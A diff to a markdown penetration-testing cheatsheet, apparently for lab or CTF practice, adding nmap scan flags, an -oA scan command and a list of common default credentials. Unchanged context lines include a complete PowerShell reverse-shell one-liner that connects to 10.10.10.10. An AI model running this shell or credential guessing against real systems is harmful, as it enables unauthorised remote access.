@@ -1,6 +1,7 @@
 # Chapter 1 - Cheatsheets
 
 
+
 ## NMAP
 
 ##### Network Scan
@@ -34,12 +35,13 @@ Kali> for ip in $(cat targets.txt);do nmap -A -T4 -oN scans/nmap.$ip.txt $ip;don
 -O - OS Detection
 --osscan-limit - light os scan
 --osscan-guess - aggressive os scan
--sV - version detection
 --version-intensity {0-9} - light to aggressive
+-sV - version detection
 -sT - connect scan
 -sU - UDP scan
 -sS - stealth syn scan
 -sN - tcp null scan
+-sC - default scripts
 -A - OS detection + nmap scripts + traceroute + version
 --script {script.nse} - load specific nmap script
 --script-args={args} - pass arguments to script
@@ -51,6 +53,8 @@ Kali> for ip in $(cat targets.txt);do nmap -A -T4 -oN scans/nmap.$ip.txt $ip;don
 Kali> nmap -p 1-65535 -sV -sS -T4 $TARGET
 Kali> nmap -v -sS -A -T4 $TARGET
 Kali> nmap -v -sV -O -sS -T4 $TARGET
+
+Kali> nmap -v -sC -sV -oA [directory/filename] $TARGET
 ```
 
 ##### Timing
@@ -94,6 +98,7 @@ Kali> nmap -v -sV -O -sS -T4 $TARGET
 -v - verbose output
 -oX - output xml
 -oG - output greppable
+-oA - output all formats
 --open - only show potentially open ports
 --packet-trace - show all packets sent/recv
 --append-output - noclobber
@@ -353,3 +358,20 @@ p.waitFor()
 ```
 PS> $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+
+## Default Credentials
+
+A list of potentially useful default credentials to try out by hand.
+
+```
+admin:Admin
+admin:admin
+admin:password
+admin:<no password>
+root:admin
+root:alpine
+guest:<no password>
+```
+
+Otherwise, here is a link you can look through and CTRL+F for a vendor should it apply.
+[github.com/danielmiessler/SecLists](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.csv)
